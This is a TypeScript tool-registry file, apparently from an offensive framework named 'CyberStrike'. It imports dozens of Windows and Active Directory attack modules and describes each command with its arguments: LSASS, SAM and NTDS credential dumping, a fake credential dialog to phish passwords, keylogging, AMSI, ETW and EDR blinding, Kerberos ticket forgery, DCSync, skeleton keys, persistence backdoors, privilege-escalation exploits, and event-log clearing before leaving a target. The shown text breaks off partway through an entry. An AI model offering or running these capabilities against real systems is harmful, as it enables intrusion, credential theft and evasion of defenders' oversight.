import z from "zod"
import { Tool } from "../tool"
import { setStealthState, argVal, hasFlag } from "./shared"
import type { Finding, HookResult, StealthMode } from "./shared"

import { lsassDump, samDump, dpapiExtract, credentialPrompt, ntdsDump, dpapiDomain, cachedCreds, mssqlCreds, wifiDump, vaultDump, sccmAbuse, browserHarvest, regSecrets, storedCredsAbuse, wdigestEnable, nanodumpAdvanced, winHelloDump, bitlockerKeys, certSteal, keepassDump, lsaSecrets } from "./credential"
import { adEnum, bloodhoundCollect, lapsDump, gpoEnum, adDnsEnum, adwsRecon, lapsV2Decrypt, primaryGroupAbuse } from "./ad-enum"
import { kerberoast, asreproast, goldenTicket, silverTicket, delegationAbuse, overpassHash, passTheTicket, diamondTicket, sapphireTicket, krbrelayup, unpacHash, bronzeBit } from "./kerberos"
import { dcsync, dcshadow, skeletonKey, adAclAbuse, adcsAbuse, shadowCreds, sidHistory, dnsAdminAbuse, adcsEscAdvanced, adminsdholder, rbcdChain } from "./ad-exploit"
import { goldenCert, passTheCert, gmsaDump, goldenGmsa, crossForest, silverSaml } from "./ad-cert-trust"
import { wmiExec, winrmExec, dcomExec, smbExec, ntlmCoerce, coercerFull, remoteMonologue, mssqlAbuse, schtaskExec, sshExec } from "./lateral"
import { schtaskPersist, servicePersist, registryPersist, wmiPersist, comHijack, startupPersist, gpoAbuse, bitsPersist, wsusAbuse, printMonitorPersist, sspPersist, passwordFilter, dsrmAbuse, accessibilityBackdoor, ifeoPersist, winlogonPersist, appinitDll, netshHelper, timeProvider, screensaverPersist, powershellProfile, activeSetup, bootExec } from "./persistence"
import { tokenImpersonate, uacBypass, potatoAttack, printspoolerAbuse, nopac, zerologon, certifried, badSuccessor, privilegeAbuse, namedPipePrivesc, alwaysInstallElevated, shadowCopyAbuse, unquotedServicePath, wslPrivesc, scheduledTaskHijack, byovd, weakServicePerms, dllSideload, serverOperatorAbuse, dllHijack, msiAbuse, backupOperatorAbuse, ridHijack } from "./privesc"
import { amsiBypass, etwBlind, defenderExclude, tokenStomp, pplBypass, psDowngrade, clmBypass, applockerBypass, stealthCheck, ppidSpoof, unhookNtdll } from "./evasion"
import { ntlmRelay, responderPoison, passwordSpray, ntlmv1Downgrade, proxyPivot, adidnsPoison, machineAccount, mitm6Attack, wpadAbuse } from "./network"
import { keylogWin, etwProcess, etwNetwork, clipboardSniff, screenshotGrab, localRecon, pipeEnum } from "./recon"
import { shareHunt, dataExfil, firewallManage, cleanupWin, eventTamper, antiForensics } from "./exfil"
import { processInject } from "./injection"
import { azureAdHybrid, exchangeAbuse, rdpHijack, rdpShadow, teamsToken } from "./hybrid"

const PROGRAMS = {
  lsass_dump: {
    description:
      "Dump LSASS process memory for credential extraction using MiniDumpWriteDump or comsvcs.dll — extracts NTLM hashes, Kerberos tickets, and plaintext passwords",
    args: "[--method comsvcs|minidump] [--outfile PATH]",
  },
  sam_dump: {
    description:
      "Extract SAM, SYSTEM, and SECURITY registry hives for offline password cracking with secretsdump or hashcat",
    args: "[--outdir PATH]",
  },
  dpapi_extract: {
    description:
      "Decrypt DPAPI-protected secrets — Chrome/Edge saved passwords, WiFi keys, Windows Credential Vault, and application credentials",
    args: "[--scope user|machine] [--browser chrome|edge|all]",
  },
  credential_prompt: {
    description:
      "Spawn a fake Windows credential dialog via CredUIPromptForCredentials to phish the current user's password",
    args: "[--message TEXT] [--title TEXT]",
  },
  keylog_win: {
    description:
      "Capture keystrokes via SetWindowsHookEx with WH_KEYBOARD_LL — logs keystrokes with window title context",
    args: "[--duration SECONDS]",
  },
  etw_process: {
    description:
      "Monitor process creation and termination via ETW or WMI Win32_ProcessStartTrace — capture PID, PPID, image path, command line",
    args: "[--duration SECONDS]",
  },
  etw_network: {
    description:
      "Monitor network connections via netstat polling or ETW Microsoft-Windows-Kernel-Network — capture source/dest IP, port, PID, protocol",
    args: "[--duration SECONDS]",
  },
  clipboard_sniff: {
    description:
      "Monitor clipboard contents for passwords, API tokens, and sensitive data — polls at configurable interval using PowerShell Get-Clipboard",
    args: "[--duration SECONDS] [--interval SECONDS]",
  },
  amsi_bypass: {
    description:
      "Bypass AMSI (Antimalware Scan Interface) by patching AmsiScanBuffer in memory — enables undetected PowerShell script execution",
    args: "[--method patch|reflection|clr]",
  },
  etw_blind: {
    description:
      "Patch NtTraceEvent / EtwEventWrite in ntdll.dll to blind EDR and AV monitoring in the current process",
    args: "",
  },
  defender_exclude: {
    description:
      "Add exclusion paths to Windows Defender via PowerShell to prevent scanning of CyberStrike tools and payloads",
    args: "--path PATH",
  },
  cleanup_win: {
    description:
      "Remove CyberStrike artifacts — clear Security/System/Application event logs, remove scheduled tasks, restore AMSI/ETW patches, delete temp files. ALWAYS run before leaving a target",
    args: "",
  },
  ad_enum: {
    description:
      "Comprehensive Active Directory enumeration — domain info, forest/trust relationships, all users (enabled/disabled/admincount/password-age/last-logon), privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators, DnsAdmins, Server Operators), computers, OUs, SPNs (kerberoastable), AdminSDHolder protected objects, fine-grained password policies, KRBTGT account info, and domain controller list",
    args: "[--target DOMAIN] [--ldap-filter FILTER] [--users-only] [--groups-only] [--computers-only] [--spns-only]",
  },
  bloodhound_collect: {
    description:
      "Collect Active Directory relationship data for attack-path graph analysis — group memberships, dangerous ACLs (GenericAll, WriteDACL, WriteOwner, GenericWrite, ForceChangePassword, AllExtendedRights on users/computers/groups/GPOs), active sessions via NetSessionEnum, local admin enumeration via NetLocalGroupGetMembers, trust relationships, and OU delegation. Outputs structured JSON",
    args: "[--target DOMAIN] [--methods all|acl|session|localadmin|trusts] [--computers FILE] [--outfile PATH]",
  },
  laps_dump: {
    description:
      "Extract LAPS (Local Administrator Password Solution) passwords from AD — legacy LAPS (ms-Mcs-AdmPwd), Windows LAPS (msLAPS-Password, msLAPS-EncryptedPassword, msLAPS-PasswordExpirationTime). Lists all computer objects with LAPS attributes readable by current user. Also checks LAPS deployment GPO and LAPS schema extensions",
    args: "[--target DOMAIN] [--computer NAME] [--legacy] [--windows-laps]",
  },
  gpo_enum: {
    description:
      "GPO security analysis — enumerate all Group Policy Objects, find cpassword values in Group.xml/Groups.xml/ScheduledTasks.xml/DataSources.xml/Printers.xml (MS14-025 / CVE-2014-1812), scheduled task scripts, logon/startup scripts, registry preferences with embedded credentials, restricted groups membership, and GPO-to-OU link mapping with enforcement status",
    args: "[--target DOMAIN] [--gpo-id GUID] [--decrypt-only]",
  },
  ad_dns_enum: {
    description:
      "Active Directory-integrated DNS zone enumeration via LDAP — query all dnsNode objects from CN=MicrosoftDNS partitions (DomainDnsZones, ForestDnsZones), ADIDNS wildcard records (*), A/AAAA/CNAME/SRV/MX records, stale/dangling records that could be hijacked, and GSSAPI-secured zone update permissions. Enumerates internal hostnames and service records for lateral movement targeting",
    args: "[--target DOMAIN] [--zone ZONE] [--type A|AAAA|CNAME|SRV|MX|ALL] [--stale-days DAYS]",
  },
  kerberoast: {
    description:
      "Request TGS tickets for SPN-registered service accounts and extract hashes for offline cracking — filters machine accounts, shows pwdLastSet/adminCount. Uses KerberosRequestorSecurityToken",
    args: "[--spn SPN] [--user USER] [--format hashcat|john]",
  },
  asreproast: {
    description:
      "Find accounts with Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH) and extract AS-REP hashes for offline cracking in $krb5asrep$ format",
    args: "[--user USER] [--format hashcat|john]",
  },
  golden_ticket: {
    description:
      "Forge a Kerberos TGT (Golden Ticket) using the krbtgt NTLM hash — grants unrestricted domain access with arbitrary group memberships including Domain/Enterprise Admins",
    args: "--krbtgt-hash HASH --domain DOMAIN --sid SID [--user USER] [--groups RIDS]",
  },
  silver_ticket: {
    description:
      "Forge a Kerberos service ticket (Silver Ticket) for a specific SPN using the service account NTLM hash — access CIFS/HTTP/MSSQL/LDAP without touching the DC",
    args: "--service-hash HASH --spn SPN --domain DOMAIN --sid SID [--user USER]",
  },
  delegation_abuse: {
    description:
      "Enumerate and exploit Kerberos delegation: unconstrained (TrustedForDelegation), constrained (msDS-AllowedToDelegateTo), and resource-based constrained delegation (RBCD via msDS-AllowedToActOnBehalfOfOtherIdentity)",
    args: "--type <unconstrained|constrained|rbcd> [--target COMPUTER] [--exploit]",
  },
  overpass_hash: {
    description:
      "Convert an NTLM hash into a Kerberos TGT (overpass-the-hash) by creating a new logon session with LsaLogonUser and KERB_INTERACTIVE_LOGON — enables pass-the-hash over Kerberos-only networks",
    args: "--user USER --hash HASH --domain DOMAIN",
  },
  pass_the_ticket: {
    description:
      "List, export, and import Kerberos tickets from memory via LsaCallAuthenticationPackage — dump all cached TGTs/TGS tickets to .kirbi files or inject a .kirbi ticket into the current session",
    args: "--action <list|export|import> [--ticket PATH] [--luid LUID]",
  },
  dcsync: {
    description:
      "DCSync attack — replicate AD credentials via DRS protocol (DrsGetNCChanges). Extract NTLM hashes for target user or all privileged accounts (krbtgt, Administrator). Requires Replicating Directory Changes + Replicating Directory Changes All rights",
    args: "--user USER [--all] [--domain DOMAIN]",
  },
  dcshadow: {
    description:
      "DCShadow — register a rogue Domain Controller, push arbitrary AD attribute changes (SPNs, ACLs, group membership, SIDHistory), then deregister. Stealthier than direct LDAP modification",
    args: "--target USER --attribute ATTR --value VALUE [--domain DOMAIN]",
  },
  skeleton_key: {
    description:
      "Inject skeleton key into DC LSASS — adds a master password that works for any account while real passwords continue to work. Survives until DC reboot",
    args: "--dc DC_HOST --password MASTER_PASS",
  },
  ad_acl_abuse: {
    description:
      "Enumerate and exploit dangerous AD ACLs: GenericAll, WriteDACL, WriteOwner, GenericWrite, ForceChangePassword, Self-Membership, AllExtendedRights (DCSync/LAPS). Modify DACLs to grant attacker control",
    args: "--action <enum|exploit> [--target USER/GROUP] [--right GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword] [--principal ATTACKER]",
  },
  adcs_abuse: {
    description:
      "AD Certificate Services exploitation — enumerate CAs and templates, detect ESC1-ESC8 vulnerabilities, request certificates with alternate subject names for privilege escalation",
    args: "--action <enum|exploit> [--template NAME] [--altname USER] [--ca CA]",
  },
  shadow_creds: {
    description:
      "Shadow Credentials attack — add KeyCredential to target's msDS-KeyCredentialLink via LDAP, then use PKINIT to get TGT as that principal without knowing the password",
    args: "--target USER/COMPUTER [--action add|remove|list]",
  },
  sid_history: {
    description:
      "SID History injection for cross-trust privilege escalation. Enumerate trust relationships and users with existing SID history. Inject SIDs to gain cross-domain access",
    args: "--action <enum|inject> [--target USER] [--sid SID_TO_ADD]",
  },
  dns_admin_abuse: {
    description:
      "Exploit DnsAdmins group membership — configure ServerLevelPluginDll on DNS service to execute arbitrary DLL as SYSTEM on the DC when service restarts",
    args: "--dll-path UNC_PATH [--dc DC_HOST] [--restart]",
  },
  wmi_exec: {
    description:
      "Execute commands on remote hosts via WMI Win32_Process.Create with optional explicit credentials for pass-the-hash lateral movement",
    args: "--target HOST --command CMD [--user USER] [--password PASS]",
  },
  winrm_exec: {
    description:
      "Execute commands via WinRM/PSRemoting on remote hosts — creates PSSession, invokes commands, supports CredSSP delegation. Checks TrustedHosts and WinRM configuration",
    args: "--target HOST --command CMD [--user USER] [--password PASS] [--credssp]",
  },
  dcom_exec: {
    description:
      "Lateral movement via DCOM objects: MMC20.Application (ExecuteShellCommand), ShellWindows (ShellExecute), ShellBrowserWindow, Excel.Application (RegisterXLL). No agent or service installation needed",
    args: "--target HOST --method <mmc|shell|excel|outlook> --command CMD [--user USER] [--password PASS]",
  },
  smb_exec: {
    description:
      "PsExec-style remote execution via SCM: create/start service on remote host through SMB, capture output, delete service. Also enumerates shares and copies files",
    args: "--target HOST --command CMD [--share SHARE] [--user USER] [--password PASS]",
  },
  ntlm_coerce: {
    description:
      "Force NTLM authentication from target to attacker-controlled host for relay attacks. Methods: PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM), ShadowCoerce (MS-FSRVP)",
    args: "--method <petitpotam|printerbug|dfscoerce|shadowcoerce> --target HOST --listener HOST",
  },
  mssql_abuse: {
    description:
      "SQL Server exploitation: xp_cmdshell enable/exec, linked server enum and double-hop, EXECUTE AS impersonation, credential extraction from agent jobs and linked configs, CLR assembly injection",
    args: "--server HOST [--command CMD] [--action <enum|exec|links|impersonate|creds>] [--user USER] [--password PASS]",
  },
  schtask_persist: {
    description:
      "Scheduled task persistence with SYSTEM or user context, multiple triggers (logon, idle, time, event), and optional SD modification to hide the task from enumeration",
    args: "--name NAME --command CMD [--trigger logon|idle|time|event] [--user SYSTEM|USER] [--hide]",
  },
  service_persist: {
    description:
      "Windows service persistence: create new service with binary path, modify existing service ImagePath, DLL service with svchost group registration, configure auto-start recovery",
    args: "--name NAME --command CMD [--action create|modify] [--start auto|demand] [--svchost-group GROUP]",
  },
  registry_persist: {
    description:
      "Registry-based persistence in Run/RunOnce, Winlogon (Shell, Userinit), Image File Execution Options (Debugger), AppInit_DLLs, Screensaver, Explorer Shell, UserInitMprLogonScript",
    args: "--method <run|winlogon|ifeo|appinit|screensaver|explorer|logonscript> --command CMD [--key HKLM|HKCU]",
  },
  wmi_persist: {
    description:
      "WMI event subscription persistence: __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding. Triggers on process creation, logon events, or timer intervals",
    args: "--name NAME --command CMD [--trigger process|logon|timer] [--interval SECONDS]",
  },
  com_hijack: {
    description:
      "COM object hijacking: scan for hijackable CLSIDs (HKCU vs HKLM InprocServer32/LocalServer32 discrepancies), scheduled task COM handlers, common targets (CMSTPLUA, MMDeviceEnumerator)",
    args: "--action <scan|hijack> [--clsid CLSID] [--dll-path PATH]",
  },
  startup_persist: {
    description:
      "Multi-vector persistence: startup folder shortcut, Group Policy logon scripts, WMI namespace backdoor (permanent event consumer in non-default namespace), Office macro template injection",
    args: "--method <startup|gpo_script|wmi_namespace|office_macro> --payload PATH [--target USER|ALL]",
  },
  token_impersonate: {
    description:
      "Token manipulation: enumerate process tokens with NtQuerySystemInformation, duplicate with DuplicateTokenEx, impersonate via ImpersonateLoggedOnUser, create process with CreateProcessWithTokenW",
    args: "--action <list|steal|impersonate> [--pid PID] [--sid SID]",
  },
  uac_bypass: {
    description:
      "UAC bypass: fodhelper (ms-settings shell command), eventvwr (mscfile handler), CMSTPLUA COM elevation moniker, DiskCleanup environment variable, SilentCleanup auto-elevate task",
    args: "--method <fodhelper|eventvwr|cmstplua|diskcleanup|silentcleanup> --command CMD",
  },
  potato_attack: {
    description:
      "SeImpersonatePrivilege to SYSTEM: JuicyPotato (DCOM BITS CLSID), PrintSpoofer (SpoolSV named pipe), GodPotato (RPCSS), SweetPotato (combined). Named pipe impersonation of SYSTEM token",
    args: "--method <juicy|printspoofer|godpotato|sweet> [--clsid CLSID] --command CMD",
  },
  printspooler_abuse: {
    description:
      "Print Spooler exploitation: PrintNightmare (CVE-2021-34527) DLL loading via AddPrinterDriverEx, SpoolFool (CVE-2022-21999) directory junction. Checks spooler service status and patch level",
    args: "--dll-path UNC_PATH [--target HOST]",
  },
  ntds_dump: {
    description:
      "Extract NTDS.dit database via Volume Shadow Copy (vssadmin) or ntdsutil IFM — contains all AD user NTLM hashes, Kerberos keys, and password history",
    args: "[--method vss|ntdsutil|ifm] [--outdir PATH]",
  },
  dpapi_domain: {
    description:
      "Extract domain DPAPI backup key from Domain Controller via LSA RPC — this master key decrypts ANY domain user's DPAPI-protected secrets (passwords, certificates, keys)",
    args: "[--dc DC_HOST]",
  },
  cached_creds: {
    description:
      "Extract Domain Cached Credentials (DCC2/mscash2) from HKLM\\SECURITY\\Cache — hashed domain passwords stored for offline logon, crackable with hashcat mode 2100",
    args: "[--outfile PATH]",
  },
  mssql_creds: {
    description:
      "Extract credentials from MSSQL Server: linked server passwords, SQL Agent job credentials, SSIS package secrets, connection strings, and sa password from registry",
    args: "--server HOST [--user USER] [--password PASS]",
  },
  wifi_dump: {
    description:
      "Extract all saved WiFi profiles and passwords including WPA2-PSK keys and 802.1X enterprise EAP credentials via netsh wlan export and DPAPI decryption",
    args: "[--format json|text]",
  },
  vault_dump: {
    description:
      "Deep extraction from Windows Credential Vault via VaultCli P/Invoke — Web Credentials, Windows Credentials, RDP saved passwords, certificate-based and generic credentials",
    args: "[--type web|windows|certificate|generic|all]",
  },
  sccm_abuse: {
    description:
      "SCCM/MECM exploitation: extract Network Access Account (NAA) credentials, PXE boot passwords, task sequence secrets, collection variables, and local policy secrets via WMI",
    args: "--action <naa|pxe|taskseq|collections|policy>",
  },
  gpo_abuse: {
    description:
      "GPO modification for persistence and code execution: create immediate scheduled tasks via GPO, add startup/logon scripts, create and link new GPOs to OUs for domain-wide code execution",
    args: "--action <create_task|add_script|link_gpo> --gpo GPO_NAME --command CMD [--ou OU_DN]",
  },
  nopac: {
    description:
      "SAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287) — rename machine account to DC name, request TGT, get service ticket as DC. Standard domain user to Domain Admin in one step. Check mode verifies MachineAccountQuota and patch level",
    args: "--action <check|exploit> [--target DC_HOSTNAME] [--new-password PASS]",
  },
  zerologon: {
    description:
      "Netlogon crypto bypass (CVE-2020-1472) — exploit AES-CFB8 zero IV weakness in MS-NRPC to reset DC machine account password to empty. WARNING: exploit mode can break DC replication and services. Check mode is safe (tests vuln without modifying)",
    args: "--action <check|exploit> --dc DC_HOSTNAME_OR_IP",
  },
  certifried: {
    description:
      "AD CS machine account certificate abuse (CVE-2022-26923) — create machine account, change dNSHostName to DC hostname, request certificate as DC, authenticate via PKINIT. Check mode enumerates vulnerable templates and StrongCertificateBindingEnforcement setting",
    args: "--action <check|exploit> [--ca CA_NAME] [--template TEMPLATE_NAME]",
  },
  bad_successor: {
    description:
      "Delegated Managed Service Account privilege escalation (CVE-2025-53779) — create dMSA linked to target account via msDS-ManagedAccountPreceding, then authenticate as target. Requires Windows Server 2025+ domain functional level. Works in 91% of default AD environments",
    args: "--action <check|exploit> [--target TARGET_USER]",
  },
  bronze_bit: {
    description:
      "Kerberos constrained delegation bypass (CVE-2020-17049) — flip forwardable bit in S4U2self service ticket to bypass 'sensitive and cannot be delegated' flag and Protected Users group protection. Extends delegation_abuse with Protected Users bypass capability",
    args: "--action <check|exploit> --target TARGET_SPN [--service SERVICE_SPN] [--impersonate USER]",
  },
  adcs_esc_advanced: {
    description:
      "Extended ADCS exploitation for ESC9-ESC17 — ESC9: CT_FLAG_NO_SECURITY_EXTENSION abuse, ESC10: weak CertificateMappingMethods, ESC11: unencrypted MS-ICPR RPC relay, ESC13: issuance policy OID group link, ESC14: altSecurityIdentities explicit mapping, ESC15/EKUwu: V1 template application policy injection, ESC16: CA-wide security extension override, ESC17: ADCS+WSUS combination attack. Extends adcs_abuse which covers ESC1-ESC8",
    args: "--action <enum|exploit> [--ca CA_NAME] [--esc 9|10|11|13|14|15|16|17|all] [--target USER]",
  },
  coercer_full: {
    description:
      "Extended NTLM coercion with 12+ RPC methods — MS-EFSR (7 opnums: EncryptFileSrv, DecryptFileSrv, QueryUsersOnFile, QueryRecoveryAgents, FileKeyInfo, DuplicateEncryptionInfoFile, AddUsersToFileEx), MS-EVEN (ElfrOpenBELW event log), MS-DNSP (DnssrvQuery), WebClient/SearchConnector WebDAV trick, MS-SAMR (SamrGetAliasMembership). Extends ntlm_coerce (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) with additional protocol abuse vectors",
    args: "--target HOST --listener IP [--method efsr_extended|even|dnsp|webclient|samr|all] [--check-only]",
  },
  rdp_hijack: {
    description:
      "RDP session hijacking via tscon.exe — enumerate active and disconnected RDP sessions, then hijack a session without credentials by running tscon as SYSTEM. Disconnected sessions are especially valuable as the user won't notice. Creates a temporary service to execute tscon as SYSTEM",
    args: "--action <enum|hijack> [--session SESSION_ID]",
  },
  token_stomp: {
    description:
      "Remove token privileges from security tool processes to cripple their monitoring capability without killing them (which triggers alerts). Targets: MsMpEng, CrowdStrike Falcon (CSFalconService), Cortex XDR, Carbon Black (CbDefense), SentinelOne, Elastic Agent, Sysmon. Uses NtOpenProcessToken + NtAdjustPrivilegesToken to strip SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege",
    args: "--action <enum|stomp> [--target PROCESS_NAME]",
  },
  adws_recon: {
    description:
      "Active Directory enumeration via ADWS (port 9389) instead of LDAP — bypasses LDAP monitoring, IDS rules, and audit logs entirely. ADWS is always enabled when AD DS is installed. Enumerates users, groups, computers, trusts, GPOs, OUs, SPNs, AdminSDHolder objects, and ACLs through the SOAP/WCF endpoint",
    args: "[--server DC_HOST] [--scope users|groups|computers|trusts|gpos|spns|acls|all]",
  },
  laps_v2_decrypt: {
    description:
      "Windows LAPS v2 encrypted password decryption — enumerate computers with msLAPS-EncryptedPassword attribute (DPAPI-NG encrypted), attempt decryption using domain backup key or current user's authorization. Extends laps_dump which handles legacy LAPS (ms-Mcs-AdmPwd) and unencrypted Windows LAPS",
    args: "--action <enum|decrypt> [--computer COMPUTER_NAME]",
  },
  primary_group_abuse: {
    description:
      "Primary Group ID manipulation for stealth persistence — change a user's primaryGroupID to Domain Admins (512) or other privileged group RID. The membership is invisible to 'net group' and most AD enumeration tools because primaryGroupID-based membership is not stored in the member attribute. Requires write access to the target user object",
    args: "--action <check|modify|revert> --target USER [--group-rid RID]",
  },
  cross_forest: {
    description:
      "Inter-forest trust enumeration and exploitation — enumerate trust relationships (type, direction, SID filtering, selective auth), foreign group memberships, cross-forest unconstrained delegation, PAM trust abuse, shared credential detection. Exploit vectors: SID filtering bypass via PAM trusts, TGT delegation across trusts, referral ticket manipulation",
    args: "--action <enum|exploit> [--target-forest FOREST_NAME] [--vector sidfilter|delegation|foreign_groups|pam|shared_creds]",
  },
  diamond_ticket: {
    description:
      "Forge a Diamond Ticket — request a legitimate TGT from the DC, decrypt it with the krbtgt AES key, modify the PAC (inject Domain Admins/Enterprise Admins group SIDs), recompute checksums, re-encrypt, and inject into cache. Unlike Golden Tickets, the TGT has a valid AS-REP and passes KDC validation — evades 4769 anomaly detection, MDI Golden Ticket alerts, and ticket lifetime checks",
    args: "--user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY [--groups 512,519,518] [--action forge|check]",
  },
  sapphire_ticket: {
    description:
      "Forge a Sapphire Ticket — use S4U2Self+User-to-User (U2U) to obtain a legitimate PAC for the target user, then graft it onto a forged ticket. Stealthiest Kerberos ticket forgery: no PAC manipulation artifacts, no forged SIDs, the PAC is genuinely issued by the KDC. Requires krbtgt AES key and a valid domain user account",
    args: "--user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY [--impersonate DA_USER]",
  },
  krbrelayup: {
    description:
      "Local privilege escalation via Kerberos relay — relay the machine account's Kerberos authentication to LDAP for RBCD setup, shadow credential injection, or ADCS certificate enrollment. Universal local privesc on default AD configs (LDAP signing disabled by default). Methods: RBCD (create machine account + set delegation), Shadow Credentials (add msDS-KeyCredentialLink), ADCS (request certificate via relay)",
    args: "--method <rbcd|shadowcred|adcs> --action <check|exploit> [--port PORT] [--ca CA_NAME]",
  },
  unpac_hash: {
    description:
      "Recover NT hash from PKINIT certificate authentication — authenticate with a certificate via Kerberos PKINIT, then extract the NTLM hash from the PAC_CREDENTIAL_INFO in the AS-REP. Completes the shadow_creds → certificate → NT hash chain. The recovered hash can be used for pass-the-hash or DCSync",
    args: "--cert CERT_PATH [--password CERT_PASS] --user USER --domain DOMAIN [--dc DC_HOST]",
  },
  golden_cert: {
    description:
      "CA private key theft and certificate forgery (Golden Certificate) — enumerate Certificate Authorities, extract CA private key via certutil backup or DPAPI decryption, then forge arbitrary certificates for any domain user. The certificate equivalent of a Golden Ticket — with the CA key, forge unlimited certs offline for domain persistence that survives krbtgt rotation",
    args: "--action <enum|extract|forge> [--ca CA_NAME] [--target-user USER] [--outfile PATH]",
  },
  pass_the_cert: {
    description:
      "Certificate-based authentication to AD services — authenticate to LDAP via Schannel TLS client certificate or to Kerberos via PKINIT. Used after shadow_creds, adcs_abuse, or golden_cert to leverage a stolen/forged certificate for AD access without knowing the password. Supports LDAP bind with startTLS and Kerberos TGT request",
    args: "--cert CERT_PATH [--password CERT_PASS] --target LDAP_SERVER --action <ldap-shell|add-user-to-group|rbcd|shadow-cred> [--target-user USER] [--target-group GROUP]",
  },
  gmsa_dump: {
    description:
      "Group Managed Service Account password extraction — enumerate all gMSA accounts, check PrincipalsAllowedToRetrieveManagedPassword ACL, read msDS-ManagedPassword blob and compute NT hash. GoldenGMSA mode extracts KDS root key for offline computation of any gMSA password without AD access",
    args: "--action <enum|extract|golden> [--target GMSA_NAME] [--dc DC_HOST]",
  },
  adminsdholder: {
    description:
      "AdminSDHolder ACL persistence — check, backdoor, or clean AdminSDHolder security descriptor. SDProp propagates AdminSDHolder ACL to all protected objects (Domain/Enterprise/Schema Admins, Account/Backup/Print/Server Operators) every 60 minutes. Adding GenericAll to AdminSDHolder grants persistent control over all privileged groups — survives password resets and manual ACL cleanup",
    args: "--action <check|backdoor|clean> --principal ATTACKER_USER",
  },
  rbcd_chain: {
    description:
      "Full Resource-Based Constrained Delegation exploitation chain — check MachineAccountQuota and RBCD config, create machine account (MAQ abuse), set msDS-AllowedToActOnBehalfOfOtherIdentity on target, perform S4U2Self+S4U2Proxy to get admin ticket, authenticate to target. Automated end-to-end from standard domain user to local admin on target host",
    args: "--action <check|exploit> --target TARGET_HOST [--new-machine-name NAME] [--new-password PASS] [--impersonate USER]",
  },
  remote_monologue: {
    description:
      "DCOM-based NTLM credential harvesting (IBM X-Force 2025) — coerce NTLM authentication from remote hosts via DCOM object manipulation without touching LSASS. Methods: ServerDataCollectorSet (Performance Monitor XML injection), FileSystemImage (IMAPI2 UNC path), UpdateSession (WSUS server redirect). Different detection signature from PetitPotam/PrinterBug",
    args: "--target HOST --listener LISTENER_IP [--method all|datacollector|filesystem|update] [--port LISTENER_PORT]",
  },
  nanodump_advanced: {
    description:
      "Advanced LSASS memory dumping with EDR bypass — multiple techniques to dump LSASS while evading endpoint detection. Fork: clone LSASS via NtCreateProcessEx and dump the clone. Snapshot: PssCreateSnapshot API. SSP: inject custom Security Package via AddSecurityPackage to intercept credentials. Seclogon: leak LSASS handle via Secondary Logon service. Each method bypasses different EDR hooks",
    args: "--method <fork|snapshot|ssp|seclogon> [--outfile PATH]",
  },
  privilege_abuse: {
    description:
      "Enumerate and exploit dangerous Windows token privileges — SeBackupPrivilege (read any file including SAM/NTDS.dit via robocopy /b), SeRestorePrivilege (write anywhere, replace utilman.exe), SeTakeOwnershipPrivilege (take ownership of any object), SeLoadDriverPrivilege (load vulnerable kernel driver), SeDebugPrivilege (inject into any process), SeManageVolumePrivilege (raw disk read), SeAssignPrimaryTokenPrivilege (create process with another token), SeImpersonatePrivilege (token theft for SYSTEM)",
    args: "--action enum|exploit --privilege PRIVILEGE_NAME [--target PATH]",
  },
  stored_creds_abuse: {
    description:
      "Enumerate stored credentials across the system — cmdkey saved credentials, AutoLogon registry (DefaultUserName/DefaultPassword), Unattend.xml/sysprep.xml base64 passwords, PowerShell ConsoleHost_history.txt, IIS application pool credentials, web.config connection strings, McAfee SiteList.xml, and Group Policy Preferences cpassword remnants",
    args: "--action enum [--deep true]",
  },
  named_pipe_privesc: {
    description:
      "Named pipe impersonation for SYSTEM privilege escalation — create a named pipe server, trick a SYSTEM-level process into connecting, then impersonate its token. Covers PrintSpooler pipe, EfsRpc pipe, custom pipe + scheduled task trigger, and SeImpersonatePrivilege token theft",
    args: "--action enum|exploit [--pipe PIPE_NAME] [--method spooler|efsrpc|task|custom]",
  },
  always_install_elevated: {
    description:
      "Check and exploit AlwaysInstallElevated policy — when both HKLM and HKCU registry keys are set to 1, any user can install MSI packages with SYSTEM privileges. Optionally run a payload MSI for instant privilege escalation",
    args: "--action check|exploit [--payload MSI_PATH]",
  },
  shadow_copy_abuse: {
    description:
      "Volume Shadow Copy abuse for credential extraction — enumerate existing shadow copies, exploit HiveNightmare/SeriousSAM (CVE-2021-36934) to read SAM/SYSTEM/SECURITY from shadow copies as unprivileged user, or create new shadow copies for privileged file access",
    args: "--action enum|exploit|create [--outdir PATH]",
  },
  unquoted_service_path: {
    description:
      "Find and exploit unquoted service paths — enumerate services with spaces in unquoted binary paths, check writable directories at each truncation point, and optionally place a payload for privilege escalation when the service restarts",
    args: "--action enum|exploit [--service SERVICE_NAME] [--payload EXE_PATH]",
  },
  wsl_privesc: {
    description:
      "WSL (Windows Subsystem for Linux) privilege escalation — abuse WSL interop to escape to Windows SYSTEM context, exploit writable WSL rootfs, or leverage WSL process execution for defense evasion. Enumerates WSL distributions, checks interop settings, and tests cross-boundary attacks",
    args: "--action enum|exploit [--distro DISTRO_NAME] [--payload CMD]",
  },
  scheduled_task_hijack: {
    description:
      "Enumerate and exploit writable scheduled task binaries for privilege escalation — find tasks running as SYSTEM with writable executable paths, missing binaries, or writable argument files. Replace the binary or modify arguments to execute arbitrary code as SYSTEM on next trigger",
    args: "--action enum|exploit [--task TASK_NAME] [--payload PATH]",
  },
  byovd: {
    description:
      "Bring Your Own Vulnerable Driver (BYOVD) — load a known-vulnerable signed kernel driver to gain kernel-level access, disable EDR/AV, or escalate privileges. Enumerates existing vulnerable drivers, checks driver signature enforcement, and supports loading drivers for kernel read/write primitives. Uses LOLDrivers project database",
    args: "--action enum|check|load [--driver DRIVER_PATH] [--target PROCESS_NAME]",
  },
  weak_service_perms: {
    description:
      "Find and exploit weak service permissions — enumerate services with modifiable DACLs (SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, WRITE_DAC, WRITE_OWNER) or writable service binaries, then optionally modify the binary path or replace the executable for privilege escalation",
    args: "--action enum|exploit [--service SERVICE_NAME] [--command CMD]",
  },
  dll_sideload: {
    description:
